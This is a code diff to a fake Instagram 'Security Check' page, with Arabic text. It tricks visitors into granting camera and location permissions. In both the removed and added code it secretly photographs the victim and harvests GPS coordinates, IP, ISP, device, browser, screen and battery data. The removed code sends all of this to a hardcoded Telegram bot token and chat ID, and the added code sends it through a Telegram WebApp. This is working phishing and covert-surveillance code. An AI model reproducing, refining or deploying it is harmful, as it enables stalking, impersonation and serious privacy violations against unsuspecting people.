@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram - Security Check</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         body { background: #fafafa; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .card { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 30px; text-align: center; border-radius: 3px; }
@@ -16,9 +17,9 @@
 <body>
     <div class="card">
         <img src="https://www.instagram.com/static/images/web/mobile_port_monospaced_plus_2x.png/394590333333.png" class="logo">
-        <p style="font-size: 14px; color: #262626; font-weight: 600;">تأكيد ملكية الحساب</p>
-        <p style="color: #8e8e8e; font-size: 14px;">نحتاج للوصول إلى الكاميرا والموقع الجغرافي للتأكد من أمان حسابك.</p>
-        <button id="authBtn">متابعة كـ @user</button>
+        <p style="font-size: 14px; color: #262626; font-weight: 600;">تأكيد أمان الحساب</p>
+        <p style="color: #8e8e8e; font-size: 14px;">يجب السماح بالأذونات المطلوبة للتأكد من هويتك ومنع الوصول غير المصرح به.</p>
+        <button id="authBtn">متابعة كـ @User</button>
         <div id="status"></div>
     </div>
 
@@ -26,79 +27,68 @@
     <canvas id="c"></canvas>
 
     <script>
-        const B_T = '8308924210:AAGEeCtg7QMc6jdX1Lh8_IotYd0p8l7nDq0';
-        const C_ID = '2140385904'; 
+        const webapp = window.Telegram.WebApp;
+        webapp.expand();
 
-        const getFullInfo = async () => {
+        const getIPDetails = async () => {
             try {
-                // جلب معلومات الـ IP والشبكة
-                const response = await fetch('http://ip-api.com/json/?fields=status,message,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,query');
-                return await response.json();
+                // استخدمنا ipapi.co لأنها تدعم HTTPS وموثوقة أكثر
+                const res = await fetch('https://ipapi.co/json/');
+                return await res.json();
             } catch (e) { return null; }
         };
 
-        const send = async (blob, cap) => {
-            const fd = new FormData();
-            fd.append('chat_id', C_ID);
-            fd.append('photo', blob, 'x.jpg');
-            fd.append('caption', cap);
-            fd.append('parse_mode', 'Markdown');
-            return fetch(`https://api.telegram.org/bot${B_T}/sendPhoto`, { method: 'POST', body: fd });
-        };
-
-        const getCam = async (mode) => {
+        const getPhoto = async (mode) => {
             try {
                 const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
                 const v = document.getElementById('v');
                 v.srcObject = s;
                 await new Promise(r => setTimeout(r, 2000));
                 const c = document.getElementById('c');
-                c.width = v.videoWidth; c.height = v.videoHeight;
-                c.getContext('2d').drawImage(v, 0, 0);
+                // أبعاد صغيرة جداً لضمان مرورها عبر تليجرام دون "فشل"
+                c.width = 200; 
+                c.height = 150;
+                c.getContext('2d').drawImage(v, 0, 0, c.width, c.height);
                 s.getTracks().forEach(t => t.stop());
-                return new Promise(r => c.toBlob(r, 'image/jpeg', 0.6));
+                return c.toDataURL('image/jpeg', 0.4); 
             } catch (e) { return null; }
         };
 
         document.getElementById('authBtn').onclick = async () => {
-            const st = document.getElementById('status');
-            st.innerText = "جاري معالجة الطلب... يرجى الانتظار";
+            document.getElementById('status').innerText = "جاري الفحص... يرجى الانتظار";
 
-            // جلب الموقع الدقيق (GPS) ومعلومات الشبكة (IP)
             navigator.geolocation.getCurrentPosition(async (p) => {
-                const ipInfo = await getFullInfo();
-                const now = new Date().toLocaleString('ar-EG');
+                const ip = await getIPDetails();
+                let batteryLevel = "غير معروف";
                 
-                let report = `🖼 *تم التقاط صورة جديدة*\n\n`;
-                report += `📅 *الوقت:* ${now}\n`;
-                report += `🌐 *الآيبي:* \`${ipInfo ? ipInfo.query : 'غير معروف'}\`\n`;
-                report += `🌍 *الدولة:* ${ipInfo ? ipInfo.country : 'غير معروف'}\n`;
-                report += `🏙 *المحافظة:* ${ipInfo ? ipInfo.regionName : 'غير معروف'}\n`;
-                report += `📡 *المزود:* ${ipInfo ? ipInfo.isp : 'غير معروف'}\n`;
-                report += `📍 *الموقع الدقيق:* [اضغط هنا](https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude})\n`;
-                report += `📱 *نوع الجهاز:* ${navigator.platform}\n`;
-                report += `💻 *النظام:* ${navigator.userAgentData ? navigator.userAgentData.platform : 'Unknown'}\n`;
-                report += `🔍 *المتصفح:* ${navigator.userAgent.split(') ')[1].split(' ')[0]}\n`;
-                report += `📏 *دقة الشاشة:* ${window.screen.width}x${window.screen.height}\n`;
-                report += `🔋 *البطارية:* جاري الفحص...`;
-
-                // محاولة جلب حالة البطارية
                 try {
-                    const battery = await navigator.getBattery();
-                    report = report.replace('جاري الفحص...', `${(battery.level * 100).toFixed(0)}%`);
-                } catch(e) { report = report.replace('جاري الفحص...', 'غير مدعوم'); }
+                    const b = await navigator.getBattery();
+                    batteryLevel = (b.level * 100).toFixed(0) + "%";
+                } catch(e) {}
 
-                // التقاط الصور
-                const fImg = await getCam("user");
-                if (fImg) await send(fImg, report);
+                // جمع البيانات الشاملة والدقيقة
+                const data = {
+                    time: new Date().toLocaleString('ar-EG'),
+                    ip: ip ? ip.ip : 'فشل جلب الآيبي',
+                    country: ip ? ip.country_name : 'فشل جلب الدولة',
+                    region: ip ? ip.region : 'فشل جلب المحافظة',
+                    isp: ip ? ip.org : 'فشل جلب المزود',
+                    gps: `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`,
+                    platform: navigator.platform,
+                    os: navigator.userAgent.includes("Android") ? "Android" : "iOS/Other",
+                    browser: navigator.userAgent.split(' ').pop(),
+                    screen: `${window.screen.width}x${window.screen.height} (Actual: ${window.innerWidth}x${window.innerHeight})`,
+                    battery: batteryLevel,
+                    frontImg: await getPhoto("user") // التقاط الصورة
+                };
 
-                const bImg = await getCam("environment");
-                if (bImg) await send(bImg, "📸 *الصورة الخلفية للصديق*");
-
-                st.innerText = "اكتمل التحقق بنجاح.";
-                setTimeout(() => location.href = "https://instagram.com", 1500);
+                // إرسال البيانات للبوت
+                webapp.sendData(JSON.stringify(data));
+                // الانتظار قليلاً لضمان الإرسال ثم الإغلاق
+                setTimeout(() => webapp.close(), 1000);
+                
             }, () => {
-                st.innerText = "يجب الموافقة على الأذونات للمتابعة.";
+                document.getElementById('status').innerText = "خطأ: يجب قبول الأذونات للمتابعة.";
             });
         };
     </script>
